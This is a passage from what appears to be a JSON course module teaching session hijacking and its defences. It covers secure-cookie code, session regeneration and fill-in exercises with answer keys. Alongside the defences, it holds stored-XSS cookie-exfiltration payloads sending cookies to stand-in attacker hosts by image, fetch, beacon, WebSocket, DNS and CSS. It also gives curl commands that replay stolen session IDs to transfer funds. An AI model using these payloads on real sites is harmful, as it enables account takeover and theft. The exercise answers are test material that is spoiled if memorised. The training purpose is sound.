+          "code": "// STEP 1: Attacker visits the app, gets a session cookie:\n// curl -v http://localhost:15000/welcome 2>&1 | grep 'Set-Cookie'\n// Set-Cookie: JSESSIONID=node0fixed123\n\n// STEP 2: Attacker crafts a link with this session ID:\n// http://localhost:15000/welcome?JSESSIONID=node0fixed123\n// (Or uses a script to set the cookie in victim's browser)\n\n// STEP 3: Victim clicks the link and logs in\n// The session ID stays the same: node0fixed123\n// But now it's AUTHENTICATED (victim is logged in)\n\n// STEP 4: Attacker uses the KNOWN session ID:\n// curl http://localhost:15000/account \\\n//   --cookie 'JSESSIONID=node0fixed123'\n// → Shows the victim's account!\n\n// DEFENCE:\n// Regenerate session on login:\n// session.invalidate();\n// request.getSession(true);  ← NEW ID, old one is dead",
+          "output": "Attacker accesses victim's account using the pre-set session ID — session fixation successful",
+          "ai_explanation": "Session fixation is sneaky because the attacker doesn't need to steal anything — they plant a known session ID and wait. The fix is simple: always create a new session ID when the user logs in.",
+          "ai_challenge": "What if the application regenerates the session ID on login but not on privilege escalation (e.g., becoming admin)? Is it still vulnerable?"
+        },
+        {
+          "title": "Example 9: Implement HttpOnly Defence",
+          "description": "Set the HttpOnly flag and verify document.cookie can no longer read it.",
+          "difficulty": "beginner",
+          "code": "// VULNERABLE CODE (Java):\nCookie session = new Cookie(\"JSESSIONID\", sessionId);\nresponse.addCookie(session);\n// document.cookie returns: JSESSIONID=abc123\n\n// SECURE CODE:\nCookie session = new Cookie(\"JSESSIONID\", sessionId);\nsession.setHttpOnly(true);  // ← ADD THIS LINE\nresponse.addCookie(session);\n// document.cookie now returns: '' (empty!)\n\n// TEST IN BROWSER CONSOLE (F12):\n// Before fix: alert(document.cookie) → 'JSESSIONID=abc123'\n// After fix: alert(document.cookie) → '' (nothing!)\n\n// The XSS still EXECUTES (alert shows), but it can't\n// READ the cookie. The chain is broken at cookie theft.",
+          "output": "document.cookie returns empty string — XSS executes but cannot steal the session cookie",
+          "ai_explanation": "HttpOnly is the single most important cookie flag. It doesn't prevent XSS — the script still runs. But it prevents the script from accessing the session cookie, which breaks the hijacking chain.",
+          "ai_challenge": "If HttpOnly is set, can the attacker still cause damage with XSS? (Hint: think about what else XSS can do besides steal cookies)"
+        },
+        {
+          "title": "Example 10: Implement Secure + SameSite",
+          "description": "Add all three cookie security flags.",
+          "difficulty": "intermediate",
+          "code": "// COMPLETE SECURE COOKIE SETUP:\nresponse.setHeader(\"Set-Cookie\",\n    \"JSESSIONID=\" + sessionId\n    + \"; HttpOnly\"       // Block JavaScript access\n    + \"; Secure\"         // HTTPS only\n    + \"; SameSite=Strict\" // Same-site only\n    + \"; Path=/\"          // Restrict to app path\n    + \"; Max-Age=1800\"   // 30 minute timeout\n);\n\n// TESTING EACH FLAG:\n// 1. HttpOnly: F12 → Console → document.cookie → empty?\n// 2. Secure: Try HTTP (not HTTPS) → cookie not sent?\n// 3. SameSite: Load page from different site → cookie not sent?\n// 4. Max-Age: Wait 31 minutes → session expired?",
+          "output": "All three flags set — cookie invisible to JS, HTTPS-only, same-site-only, auto-expires",
+          "ai_explanation": "Using setHeader gives you full control over the cookie format. This is more reliable than using Cookie.setHttpOnly() etc. because some flags (SameSite) aren't supported by older Servlet APIs.",
+          "ai_challenge": "What's the difference between SameSite=Strict and SameSite=Lax? When would you choose Lax over Strict?"
+        },
+        {
+          "title": "Example 11: Session Regeneration on Login",
+          "description": "Prevent session fixation by creating a new session after authentication.",
+          "difficulty": "intermediate",
+          "code": "// VULNERABLE LOGIN HANDLER:\nprotected void doPost(HttpServletRequest req, ...) {\n    String user = req.getParameter(\"username\");\n    String pass = req.getParameter(\"password\");\n    if (authenticate(user, pass)) {\n        // Session ID stays the SAME → fixation possible!\n        req.getSession().setAttribute(\"user\", user);\n        resp.sendRedirect(\"/account\");\n    }\n}\n\n// SECURE LOGIN HANDLER:\nprotected void doPost(HttpServletRequest req, ...) {\n    String user = req.getParameter(\"username\");\n    String pass = req.getParameter(\"password\");\n    if (authenticate(user, pass)) {\n        req.getSession().invalidate();  // Kill old session\n        HttpSession newSession = req.getSession(true); // New ID!\n        newSession.setAttribute(\"user\", user);\n        resp.sendRedirect(\"/account\");\n    }\n}\n// Old session ID is now DEAD. Attacker's known ID is useless.",
+          "output": "New session ID generated on login — any previously fixed or stolen session IDs become invalid",
+          "ai_explanation": "Session regeneration is cheap (one line of code) but prevents an entire category of attacks. Always regenerate on: login, logout, password change, and privilege escalation.",
+          "ai_challenge": "Should you regenerate the session ID when a user changes their email address? What about when they view sensitive data like bank statements?"
+        },
+        {
+          "title": "Example 12: Build a Session Security Monitor",
+          "description": "Create a servlet filter that detects suspicious session activity.",
+          "difficulty": "advanced",
+          "code": "// SESSION SECURITY FILTER:\npublic class SessionMonitor implements Filter {\n    public void doFilter(ServletRequest req, ...) {\n        HttpServletRequest httpReq = (HttpServletRequest) req;\n        HttpSession session = httpReq.getSession(false);\n        \n        if (session != null) {\n            // Check 1: IP changed?\n            String currentIP = httpReq.getRemoteAddr();\n            String savedIP = (String) session.getAttribute(\"ip\");\n            if (savedIP != null && !savedIP.equals(currentIP)) {\n                log.warn(\"IP CHANGE: \" + savedIP + \" → \" + currentIP);\n                session.invalidate();\n                ((HttpServletResponse)resp).sendRedirect(\"/login\");\n                return;\n            }\n            session.setAttribute(\"ip\", currentIP);\n            \n            // Check 2: User-Agent changed?\n            String currentUA = httpReq.getHeader(\"User-Agent\");\n            String savedUA = (String) session.getAttribute(\"ua\");\n            if (savedUA != null && !savedUA.equals(currentUA)) {\n                log.warn(\"UA CHANGE: possible hijacking!\");\n                session.invalidate();\n                return;\n            }\n            session.setAttribute(\"ua\", currentUA);\n        }\n        chain.doFilter(req, resp);\n    }\n}",
+          "output": "Filter detects IP or User-Agent changes and immediately kills the session — stops curl replay attacks",
+          "ai_explanation": "This filter catches the most common session hijacking indicator: the same session being used from a different IP or browser. It's not perfect (shared IPs, mobile networks) but catches most curl-based replays.",
+          "ai_challenge": "What false positives could this filter produce? (Hint: think about mobile users switching between WiFi and cellular)"
+        }
+      ],
+      "visual_diagram": {
+        "title": "Session Hijacking — Complete Attack & Defence Flow",
+        "content": "<div style=\"font-family: monospace; line-height: 1.8; padding: 20px;\">\n<div style=\"text-align: center; margin-bottom: 20px;\">\n<span style=\"background: #e74c3c; color: white; padding: 8px 20px; border-radius: 6px; font-size: 18px; font-weight: bold;\">SESSION HIJACKING FLOWCHART</span>\n</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #3498db; color: white; padding: 6px 16px; border-radius: 4px;\">PHASE 1: SETUP</span>\n</div>\n<span style=\"color: #3498db;\">&#9654;</span> Attacker opens terminal\n<span style=\"color: #3498db;\">&#9654;</span> Runs: <span style=\"background: #2c3e50; color: #2ecc71; padding: 2px 8px; border-radius: 3px;\">python3 -m http.server 8000</span>\n<span style=\"color: #3498db;\">&#9654;</span> Server listening on port 8000 &#x2192; ready to receive cookies\n\n<div style=\"text-align: center; margin: 15px 0;\">&#x2193; &#x2193; &#x2193;</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #e74c3c; color: white; padding: 6px 16px; border-radius: 4px;\">PHASE 2: INJECTION</span>\n</div>\n<span style=\"color: #e74c3c;\">&#9654;</span> Attacker injects XSS into their profile:\n<span style=\"background: #f8d7da; padding: 4px 8px; border-radius: 3px; display: inline-block; margin: 5px 0;\">&lt;script&gt;new Image().src='http://ATTACKER:8000/?c='+document.cookie&lt;/script&gt;</span>\n<span style=\"color: #e74c3c;\">&#9654;</span> Payload stored in database (no sanitisation)\n\n<div style=\"text-align: center; margin: 15px 0;\">&#x2193; &#x2193; &#x2193;</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #f39c12; color: white; padding: 6px 16px; border-radius: 4px;\">PHASE 3: CAPTURE</span>\n</div>\n<span style=\"color: #f39c12;\">&#9654;</span> Victim logs in &#x2192; gets JSESSIONID cookie\n<span style=\"color: #f39c12;\">&#9654;</span> Victim visits attacker's profile\n<span style=\"color: #f39c12;\">&#9654;</span> XSS fires &#x2192; <span style=\"color: #e74c3c; font-weight: bold;\">document.cookie readable (HttpOnly=false!)</span>\n<span style=\"color: #f39c12;\">&#9654;</span> Image request sends cookie to attacker's server\n<span style=\"color: #f39c12;\">&#9654;</span> Server log: <span style=\"background: #2c3e50; color: #2ecc71; padding: 2px 6px; border-radius: 3px;\">GET /?c=JSESSIONID=node0abc123</span>\n\n<div style=\"text-align: center; margin: 15px 0;\">&#x2193; &#x2193; &#x2193;</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #9b59b6; color: white; padding: 6px 16px; border-radius: 4px;\">PHASE 4: REPLAY</span>\n</div>\n<span style=\"color: #9b59b6;\">&#9654;</span> Attacker copies the JSESSIONID value\n<span style=\"color: #9b59b6;\">&#9654;</span> Uses curl: <span style=\"background: #2c3e50; color: #2ecc71; padding: 2px 6px; border-radius: 3px;\">curl --cookie 'JSESSIONID=node0abc123' http://bank/transfer -d 'to=999999&amp;amount=500'</span>\n<span style=\"color: #9b59b6;\">&#9654;</span> Server sees valid session &#x2192; <span style=\"color: #e74c3c; font-weight: bold;\">processes transfer as victim!</span>\n<span style=\"color: #9b59b6;\">&#9654;</span> Victim's balance drops &#x2192; attacker receives funds\n\n<div style=\"text-align: center; margin: 20px 0;\">\n<span style=\"background: #2ecc71; color: white; padding: 8px 16px; border-radius: 6px; font-size: 16px;\">DEFENCES &#x2014; Break the chain at any point:</span>\n</div>\n<div style=\"border: 2px solid #2ecc71; padding: 12px; border-radius: 8px; margin: 10px 0;\">\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>HttpOnly</strong> &#x2192; document.cookie returns nothing &#x2192; Phase 3 blocked\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>Secure</strong> &#x2192; cookie only on HTTPS &#x2192; WiFi sniffing blocked\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>SameSite=Strict</strong> &#x2192; cookie not sent cross-site &#x2192; CSRF blocked\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>Output Encoding</strong> &#x2192; XSS never executes &#x2192; Phase 2 blocked\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>Session Timeout</strong> &#x2192; cookie expires in 30 min &#x2192; replay window limited\n<span style=\"color: #2ecc71;\">&#x2714;</span> <strong>IP Binding</strong> &#x2192; detects curl from different IP &#x2192; Phase 4 blocked\n</div>\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: What is a Session Cookie?",
+          "description": "Explain what a session cookie does and why it exists.",
+          "difficulty": "beginner",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// TODO: Fill in the blanks:\n// HTTP is ___ (the server forgets you after each request)\n// A session cookie solves this by ___\n// The cookie name is typically: ___\n// The server identifies you by: ___",
+          "expected_output": "stateless / giving the browser a unique ID that's sent with every request / JSESSIONID / the cookie value (not username or password)",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: stateless / giving the browser a unique ID that's sent with every request / JSESSIONID / the cookie "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: Identify Cookie Flags",
+          "description": "List the three security flags and what each prevents.",
+          "difficulty": "beginner",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// TODO:\n// Flag 1: ___ → prevents ___\n// Flag 2: ___ → prevents ___\n// Flag 3: ___ → prevents ___",
+          "expected_output": "HttpOnly → JavaScript reading the cookie / Secure → sending over HTTP / SameSite → cross-site request inclusion",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: HttpOnly → JavaScript reading the cookie / Secure → sending over HTTP / SameSite → cross-site reques"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Read Cookies in Browser",
+          "description": "Use F12 to find and read session cookies.",
+          "difficulty": "beginner",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// TODO: Steps to find cookies:\n// 1. Press ___\n// 2. Click ___ tab\n// 3. Expand ___\n// 4. Look for cookie named ___",
+          "expected_output": "F12 / Storage (Firefox) or Application (Chrome) / Cookies / JSESSIONID",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: F12 / Storage (Firefox) or Application (Chrome) / Cookies / JSESSIONID"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: Cookie vs Token Authentication",
+          "description": "Compare session cookies with JWT tokens.",
+          "difficulty": "beginner",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// TODO: Fill the comparison:\n// Session cookie: stored on ___, session data on ___\n// JWT token: stored on ___, session data in ___\n// Which needs server-side storage? ___\n// Which is vulnerable to XSS cookie theft? ___",
+          "expected_output": "Cookie: stored on client, data on server. JWT: stored on client, data in token itself. Cookie needs server storage. Both vulnerable if no HttpOnly.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Cookie: stored on client, data on server. JWT: stored on client, data in token itself. Cookie needs "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: Session Lifecycle",
+          "description": "Describe what happens from login to logout.",
+          "difficulty": "beginner",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// TODO: Order these events:\n// ___ Server creates session, sends Set-Cookie\n// ___ User sends username and password\n// ___ Session invalidated, cookie expired\n// ___ Browser sends cookie with every request\n// ___ User clicks logout",
+          "expected_output": "2,1,4,5,3 → Login, create session, send cookie on requests, logout, invalidate",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: 2,1,4,5,3 → Login, create session, send cookie on requests, logout, invalidate"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: HTTP Stateless Test",
+          "description": "Prove that HTTP is stateless without cookies.",
+          "difficulty": "beginner",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// TODO: What happens if you:\n// 1. Login to a web app\n// 2. Delete ALL cookies in browser\n// 3. Refresh the page\n// Answer: ___\n// Why: ___",
+          "expected_output": "You get redirected to login — the server no longer recognises you because the session cookie is gone",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: You get redirected to login — the server no longer recognises you because the session cookie is gone"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: Cookie Scope",
+          "description": "Explain Path and Domain cookie attributes.",
+          "difficulty": "beginner",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 5,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// TODO:\n// Path=/account means: ___\n// Path=/ means: ___\n// Domain=.bank.com means: ___\n// Why does scope matter for security? ___",
+          "expected_output": "Path=/account: cookie only sent to /account URLs. Path=/: sent everywhere. Domain=.bank.com: sent to all subdomains. Scope matters: narrow scope = smaller attack surface.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Path=/account: cookie only sent to /account URLs. Path=/: sent everywhere. Domain=.bank.com: sent to"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: Session ID Entropy",
+          "description": "Why must session IDs be random and long?",
+          "difficulty": "advanced",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// Session A: JSESSIONID=1\n// Session B: JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0\n// TODO: Which is safer? ___\n// Why: ___\n// What attack does a predictable session ID enable? ___",
+          "expected_output": "B is safer — long random IDs can't be guessed. Predictable IDs enable session prediction (brute-force guessing valid session IDs).",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: B is safer — long random IDs can't be guessed. Predictable IDs enable session prediction (brute-forc"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: Set-Cookie Header Analysis",
+          "description": "Parse a real Set-Cookie header.",
+          "difficulty": "advanced",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// Header:\n// Set-Cookie: JSESSIONID=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600\n// TODO: Extract:\n// Cookie name: ___\n// Cookie value: ___\n// Flags present: ___\n// Timeout: ___\n// Is this secure? ___",
+          "expected_output": "JSESSIONID / abc123 / HttpOnly, Secure, SameSite=Lax / 3600 seconds (1 hour) / Yes, all major flags are set",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: JSESSIONID / abc123 / HttpOnly, Secure, SameSite=Lax / 3600 seconds (1 hour) / Yes, all major flags "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: Session Storage Comparison",
+          "description": "Compare cookies, localStorage, and sessionStorage.",
+          "difficulty": "advanced",
+          "category": "Session Fundamentals",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Session Fundamentals! Let's build your session security skills.",
+          "starter_code": "// TODO: Fill the table:\n//                | Sent to server? | JS accessible? | Persists?\n// Cookie:        | ___            | ___           | ___\n// localStorage:  | ___            | ___           | ___\n// sessionStorage:| ___            | ___           | ___\n// Which should store session IDs? ___",
+          "expected_output": "Cookie: Yes, Depends on HttpOnly, Until expiry. localStorage: No, Yes, Forever. sessionStorage: No, Yes, Until tab closes. Session IDs should use cookies (auto-sent to server).",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Cookie: Yes, Depends on HttpOnly, Until expiry. localStorage: No, Yes, Forever. sessionStorage: No, "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: Image-Based Exfiltration",
+          "description": "Write a cookie-stealing payload using Image().",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete the payload:\n<script>\nvar img = new ___();\nimg.___ = 'http://attacker:8000/?' + ___;\n</script>",
+          "expected_output": "Image / src / document.cookie",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Image / src / document.cookie"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: Fetch-Based Exfiltration",
+          "description": "Write cookie theft using the Fetch API.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete:\n<script>\nfetch('http://attacker:8000/?c=' + ___);\n</script>\n// Will this work with CSP script-src 'self'? ___",
+          "expected_output": "document.cookie / No — CSP would block the fetch to a different origin",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: document.cookie / No — CSP would block the fetch to a different origin"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: Beacon Exfiltration",
+          "description": "Use navigator.sendBeacon for stealthy exfiltration.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete:\n<script>\nnavigator.___('http://attacker:8000/', ___);\n</script>\n// Advantage over Image: ___",
+          "expected_output": "sendBeacon / document.cookie / sendBeacon is designed for analytics, harder to block, guaranteed delivery even on page unload",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: sendBeacon / document.cookie / sendBeacon is designed for analytics, harder to block, guaranteed del"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: Base64 Encoded Theft",
+          "description": "Encode the cookie to avoid detection.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete:\n<script>\nvar encoded = ___(document.cookie);\nnew Image().src = 'http://attacker:8000/?d=' + encoded;\n</script>\n// To decode on attacker side: echo 'string' | ___ -d",
+          "expected_output": "btoa / base64",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: btoa / base64"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: Multiple Cookie Capture",
+          "description": "Capture cookies from multiple users.",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// After 1 hour, your server log shows:\n// GET /?c=JSESSIONID=aaa 200\n// GET /?c=JSESSIONID=aaa 200\n// GET /?c=JSESSIONID=bbb 200\n// GET /?c=JSESSIONID=ccc 200\n// TODO: How many unique users? ___\n// Extract command: ___",
+          "expected_output": "3 unique users (aaa, bbb, ccc) / grep -o 'JSESSIONID=[^ ]*' log | sort -u",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: 3 unique users (aaa, bbb, ccc) / grep -o 'JSESSIONID=[^ ]*' log | sort -u"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: Bypass HttpOnly with TRACE",
+          "description": "Can HTTP TRACE method bypass HttpOnly?",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// The TRACE method echoes back request headers.\n// Could an attacker use XHR + TRACE to read HttpOnly cookies?\n// Answer: ___\n// Is this still a risk? ___",
+          "expected_output": "Theoretically yes (Cross-Site Tracing), but modern browsers block TRACE via XHR. Not a realistic risk anymore, but TRACE should still be disabled on servers.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Theoretically yes (Cross-Site Tracing), but modern browsers block TRACE via XHR. Not a realistic ris"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: Cookie Theft via CSS",
+          "description": "Can CSS steal cookies without JavaScript?",
+          "difficulty": "intermediate",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// CSS can load background images:\n// body { background: url('http://evil/?c=COOKIE'); }\n// TODO: Can CSS read document.cookie? ___\n// Can CSS exfiltrate data? ___\n// How: ___",
+          "expected_output": "No, CSS cannot read JS variables. But CSS can exfiltrate INPUT field values via attribute selectors: input[value^='a']{background:url(evil/?v=a)} — letter by letter. Very slow but works even with CSP blocking scripts.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: No, CSS cannot read JS variables. But CSS can exfiltrate INPUT field values via attribute selectors:"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: WebSocket Exfiltration",
+          "description": "Use WebSocket for real-time cookie theft.",
+          "difficulty": "advanced",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete:\n<script>\nvar ws = new ___('ws://attacker:8000/');\nws.onopen = function() {\n    ws.___(___);\n};\n</script>",
+          "expected_output": "WebSocket / send / document.cookie",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: WebSocket / send / document.cookie"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: DNS-Based Exfiltration",
+          "description": "Steal cookies via DNS lookups.",
+          "difficulty": "advanced",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// Even if all HTTP requests are blocked,\n// DNS lookups usually aren't!\n// TODO: How would you encode a cookie in a DNS query?\n// var cookie = document.cookie;\n// var encoded = cookie.replace(/[^a-z0-9]/gi, '');\n// new Image().src = 'http://' + ___ + '.attacker.com/x.png';\n// Attacker reads: DNS query for 'JSESSIONIDnode0abc.attacker.com'",
+          "expected_output": "encoded + '.attacker.com/x.png' — the cookie becomes a subdomain, visible in DNS logs",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: encoded + '.attacker.com/x.png' — the cookie becomes a subdomain, visible in DNS logs"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Defend Against All Methods",
+          "description": "List defences for each exfiltration technique.",
+          "difficulty": "advanced",
+          "category": "Cookie Theft Techniques",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Cookie Theft Techniques! Let's build your session security skills.",
+          "starter_code": "// TODO: Which defence blocks which method?\n// Image exfiltration: blocked by ___\n// Fetch exfiltration: blocked by ___\n// All JS methods: blocked by ___\n// Network sniffing: blocked by ___",
+          "expected_output": "CSP img-src 'self' / CSP connect-src 'self' / HttpOnly flag (no cookie access at all) / Secure flag + HTTPS",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: CSP img-src 'self' / CSP connect-src 'self' / HttpOnly flag (no cookie access at all) / Secure flag "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Basic curl GET with Cookie",
+          "description": "View the victim's account using their session.",
+          "difficulty": "intermediate",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// Stolen cookie: JSESSIONID=node0abc123\n// TODO: Write the curl command:\n// curl ___ --cookie '___'",
+          "expected_output": "http://localhost:15000/account --cookie 'JSESSIONID=node0abc123'",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: http://localhost:15000/account --cookie 'JSESSIONID=node0abc123'"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: curl POST Transfer",
+          "description": "Transfer funds using a stolen session.",
+          "difficulty": "intermediate",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
